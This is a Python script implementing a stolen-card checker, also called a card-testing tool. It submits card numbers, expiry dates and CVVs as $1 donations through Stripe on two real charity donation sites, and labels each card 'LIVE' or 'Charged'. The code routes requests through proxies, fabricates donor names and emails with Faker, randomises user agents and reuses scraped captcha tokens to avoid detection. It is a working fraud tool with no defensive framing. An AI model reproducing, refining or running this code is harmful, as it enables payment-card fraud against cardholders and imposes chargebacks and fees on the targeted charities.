import re
import random
import time
import uuid
import html
from fake_useragent import UserAgent
from faker import Faker
import requests
_pp5_ua = UserAgent()
def _v3_format_proxy(proxy):
    if not proxy:
        return None
    parts = proxy.split(':')
    if len(parts) == 4:
        ip, port, user, password = parts[0], parts[1], parts[2], parts[3]
        return f'http://{user}:{password}@{ip}:{port}'
    if len(parts) == 2:
        ip, port = parts
        return f'http://{ip}:{port}'
    return None
_PP5_SITE = "https://www.unitedwaykitsap.org"
_PP5_DONATE = f"{_PP5_SITE}/Donate/"
_PP5_AJAX = f"{_PP5_SITE}/wp-admin/admin-ajax.php"
_PP5_STRIPE_API = "https://api.stripe.com/v1/payment_methods"
_PP5_FALLBACK_KEY = "pk_live_xxxxxxxxxxxxxxxxxxxx"
_PP5_FORM_ID = "101"
_PP5_ERR_KEYWORDS = [
    'card declined', 'insufficient funds', 'do not honor',
    'pickup card', 'invalid card', 'invalid number',
    'card not supported', 'transaction not allowed',
    'stolen card', 'lost card', 'invalid amount',
    'amount not supported', 'invalid expiry',
    'incorrect cvc', 'security code',
]
def check_pp5(
    cc, mm, yy, cvv,
    proxy=None,
):
    try:
        mm = mm.zfill(2)
        if len(yy) == 4:
            yy_exp = yy[-2:]
        else:
            yy_exp = yy.zfill(2)
        session = requests.Session()
        session.verify = False
        proxy_url = _v3_format_proxy(proxy)
        if proxy_url:
            session.proxies = {"http": proxy_url, "https": proxy_url}
        ua = _pp5_ua.random
        fake = Faker()
        email = fake.email()
        name = fake.name()
        resp = session.get(
            _PP5_DONATE,
            params={"form-id": _PP5_FORM_ID, "payment-mode": "stripe",
                    "level-id": "custom", "custom-amount": "1"},
            headers={
                "authority": "www.unitedwaykitsap.org",
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "referer": _PP5_DONATE,
                "user-agent": ua,
            },
            timeout=(20, 30),
        )
        page_html = resp.text
        m = re.search(r'name="give-form-hash" value="([^"]+)"', page_html)
        form_hash = m.group(1) if m else ""
        if not form_hash:
            return False, "Could not fetch form hash"
        pk = re.search(r'"publishable_key":"(pk_[^"]+)"', page_html)
        stripe_key = pk.group(1) if pk else _PP5_FALLBACK_KEY
        resp = session.post(
            _PP5_AJAX,
            headers={
                "authority": "www.unitedwaykitsap.org",
                "accept": "*/*",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "origin": _PP5_SITE,
                "referer": _PP5_DONATE,
                "user-agent": ua,
                "x-requested-with": "XMLHttpRequest",
            },
            data={
                "give-honeypot": "",
                "give-form-id-prefix": "101-1",
                "give-form-id": _PP5_FORM_ID,
                "give-form-title": "Make a gift today",
                "give-current-url": _PP5_DONATE,
                "give-form-url": _PP5_DONATE,
                "give-form-minimum": "1",
                "give-form-maximum": "1000000",
                "give-form-hash": form_hash,
                "give-price-id": "custom",
                "give-recurring-logged-in-only": "",
                "give-logged-in-only": "1",
                "_give_is_donation_recurring": "0",
                "give_recurring_donation_details": '{"give_recurring_option":"yes_donor"}',
                "give-amount": "1",
                "give-recurring-period-donors-choice": "month",
                "address": "New york 50 park",
                "give_stripe_payment_method": "",
                "payment-mode": "stripe",
                "give_title": "Mr.",
                "give_first": name,
                "give_last": name,
                "give_company_name": name,
                "give_email": email,
                "card_name": name,
                "give_action": "purchase",
                "give-gateway": "stripe",
                "action": "give_process_donation",
                "give_ajax": "true",
            },
            timeout=(20, 30),
        )
        headers_stripe = {
            "authority": "api.stripe.com",
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com",
            "referer": "https://js.stripe.com/",
            "user-agent": ua,
        }
        stripe_data = (
            f"type=card"
            f"&billing_details[name]={name}"
            f"&billing_details[email]={email}"
            f"&card[number]={cc}"
            f"&card[cvc]={cvv}"
            f"&card[exp_month]={mm}"
            f"&card[exp_year]={yy_exp}"
            f"&payment_user_agent=stripe.js%2F1e42d46cc8%3B+stripe-js-v3%2F1e42d46cc8%3B+split-card-element"
            f"&key={stripe_key}"
        )
        resp = session.post(
            _PP5_STRIPE_API,
            headers=headers_stripe,
            data=stripe_data,
            timeout=(20, 30),
        )
        pm_json = resp.json()
        if "error" in pm_json:
            err = pm_json["error"]
            code = err.get("code", "")
            msg = err.get("message", "Stripe error")
            decline_code = err.get("decline_code", "")
            if "incorrect_cvc" in code or "security code" in msg.lower():
                return True, f"LIVE (CVV issue) - {msg[:80]}"
            if decline_code:
                return False, f"Declined: {decline_code} - {msg[:80]}"
            return False, f"Declined: {msg[:80]}"
        pm_id = pm_json.get("id")
        if not pm_id:
            return False, "Could not create PaymentMethod"
        resp = session.post(
            _PP5_DONATE,
            params={"payment-mode": "stripe", "form-id": _PP5_FORM_ID},
            headers={
                "authority": "www.unitedwaykitsap.org",
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "content-type": "application/x-www-form-urlencoded",
                "origin": _PP5_SITE,
                "referer": f"{_PP5_DONATE}?form-id={_PP5_FORM_ID}&payment-mode=stripe&level-id=custom&custom-amount=0.50",
                "user-agent": ua,
            },
            data={
                "give-honeypot": "",
                "give-form-id-prefix": "101-1",
                "give-form-id": _PP5_FORM_ID,
                "give-form-title": "Make a gift today",
                "give-current-url": _PP5_DONATE,
                "give-form-url": _PP5_DONATE,
                "give-form-minimum": "1",
                "give-form-maximum": "1000000",
                "give-form-hash": form_hash,
                "give-price-id": "custom",
                "give-recurring-logged-in-only": "",
                "give-logged-in-only": "1",
                "_give_is_donation_recurring": "0",
                "give_recurring_donation_details": '{"give_recurring_option":"yes_donor"}',
                "give-amount": "1",
                "give-recurring-period-donors-choice": "month",
                "address": "New york 50 park",
                "give_stripe_payment_method": pm_id,
                "payment-mode": "stripe",
                "give_title": "Mr.",
                "give_first": name,
                "give_last": name,
                "give_company_name": name,
                "give_email": email,
                "card_name": name,
                "give_action": "purchase",
                "give-gateway": "stripe",
            },
            timeout=(20, 30),
        )
        text = resp.text
        text_lower = text.lower()
        m = re.search(
            r'<div[^>]*class="[^"]*give_notices[^"]*"[^>]*>(.*?)</div>\s*</div>',
            text, re.DOTALL,
        )
        if m:
            msg = re.sub(r'<[^>]+>', '', m.group(0))
            msg = html.unescape(msg).strip()
            msg_lower = msg.lower()
            for kw in _PP5_ERR_KEYWORDS:
                if kw in msg_lower:
                    return False, f"Declined: {msg[:120]}"
            if any(w in msg_lower for w in ("success", "receipt", "thank you", "donation received")):
                return True, f"Charged $1: {msg[:80]}"
            return False, f"Error: {msg[:120]}"
        m = re.search(r'Error:\s*([^<]+)', text)
        if m:
            err = m.group(1).strip()
            err_lower = err.lower()
            if "security code" in err_lower:
                return True, f"LIVE (CVV issue) - {err[:80]}"
            return False, f"Declined: {err[:120]}"
        if "donation received" in text_lower or "receipt" in text_lower:
            return True, "Charged $1"
        for kw in _PP5_ERR_KEYWORDS:
            if kw in text_lower:
                return False, f"Declined: {kw}"
        return False, "Declined: Unknown response"
    except requests.exceptions.ConnectionError:
        return False, "proxy dead"
    except requests.exceptions.Timeout:
        return False, "Request timeout"
    except Exception as exc:
        return False, f"Error: {str(exc)[:80]}"
def check_st1_1(
    cc, mm, yy, cvv,
    proxy=None,
):
    try:
        mm = mm.zfill(2)
        if len(yy) == 4:
            yy_exp = yy[-2:]
        else:
            yy_exp = yy.zfill(2)
        session = requests.Session()
        session.verify = False
        proxy_url = _v3_format_proxy(proxy)
        if proxy_url:
            session.proxies = {"http": proxy_url, "https": proxy_url}
        fake = Faker()
        first_name = fake.first_name()
        last_name = fake.last_name()
        email = fake.email()
        ua = random.choice([
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36',
        ])
        stripe_key = "pk_live_xxxxxxxxxxxxxxxxxxxx"
        base_url = "https://cause.lundadonate.org/volteuropa/070d07ae192d4a31909e090e82b0d768"
        r = session.get(base_url, headers={'user-agent': ua}, timeout=60)
        html = r.text
        muid = str(uuid.uuid4()).replace('-', '')[:32]
        sid = str(uuid.uuid4()).replace('-', '')[:32]
        uid_m = re.search(r'uid[=:]\s*["\']?([a-zA-Z0-9]+)', html)
        uid = uid_m.group(1) if uid_m else "16csssspx04xiwohty6565y67g1px"
        hcaptcha_m = re.search(r'hcaptcha_token["\']?\s*:\s*["\']([^"\']+)', html)
        hcaptcha = hcaptcha_m.group(1) if hcaptcha_m else ''
        page_id_m = re.search(r'pageId["\']?\s*:\s*(\d+)', html)
        page_id = page_id_m.group(1) if page_id_m else '3972'
        stripe_v_m = re.search(r'stripe\.js[^/]*/([a-f0-9]+)', html)
        stripe_version = stripe_v_m.group(1) if stripe_v_m else '39914d4bef'
        guid = str(uuid.uuid4())
        client_session_id = str(uuid.uuid4())
        stripe_data = {
            'type': 'card', 'card[number]': cc, 'card[cvc]': cvv,
            'card[exp_month]': mm, 'card[exp_year]': yy_exp,
            'guid': guid, 'muid': muid, 'sid': sid,
            'payment_user_agent': f"stripe.js/{stripe_version}; stripe-js-v3/{stripe_version}; card-element",
            'referrer': 'https://cause.lundadonate.org',
            'time_on_page': str(random.randint(20000, 40000)),
            'key': stripe_key,
        }
        if hcaptcha:
            stripe_data['radar_options[hcaptcha_token]'] = hcaptcha
        r = session.post('https://api.stripe.com/v1/payment_methods',
            headers={'accept': 'application/json', 'content-type': 'application/x-www-form-urlencoded',
                     'origin': 'https://js.stripe.com', 'referer': 'https://js.stripe.com/', 'user-agent': ua},
            data=stripe_data, timeout=60)
        pm_json = r.json()
        if 'error' in pm_json:
            err = pm_json['error']
            code = err.get('code', '')
            msg = err.get('message', 'Stripe error')
            if 'incorrect_cvc' in code or 'security code' in msg.lower():
                return True, f"LIVE (CVV issue) - {msg[:80]}"
            return False, f"Declined: {msg[:100]}"
        pm_id = pm_json.get('id')
        if not pm_id:
            return False, "Could not create PaymentMethod"
        payment_data = {
            "pageId": int(page_id), "paymentMethodId": pm_id,
            "amount": 1, "selectedPaymentType": "ONE_TIME",
            "metadata": {
                "fullPageUrl": base_url, "referrer": base_url,
                "userAgent": ua, "locale": "en-US",
                "gdpr2": "true", "Terms": "true", "email": email,
                "lastname": last_name, "firstname": first_name,
                "CARD/complete": "true",
                "payment": {"paymentMethodId": "CARD"},
                "donationAmount": 1, "paymentType": "ONE_TIME"
            },
            "paymentMethodType": "CARD", "locale": "en-US",
            "uid": uid, "customerParams": {"name": f"{first_name} {last_name}"}
        }
        r = session.post('https://cause.lundadonate.org/api/services/v1/payment-stripe/payment',
            headers={'accept': 'application/json, text/plain, */*', 'content-type': 'application/json',
                     'origin': 'https://cause.lundadonate.org', 'referer': base_url, 'user-agent': ua},
            json=payment_data, timeout=90)
        result = r.json()
        if isinstance(result, dict):
            if result.get('success') or result.get('status') in ('succeeded', 'complete'):
                pid = result.get('paymentId', result.get('id', 'N/A'))
                return True, f"Charged $1 (ID: {pid})"
            msg = result.get('message', result.get('error', 'Declined'))
            return False, f"Declined: {msg[:100]}"
        return False, "Declined: Unknown response"
    except requests.exceptions.ConnectionError:
        return False, "proxy dead"
    except requests.exceptions.Timeout:
        return False, "Request timeout"
    except Exception as exc:
        return False, f"Error: {str(exc)[:80]}"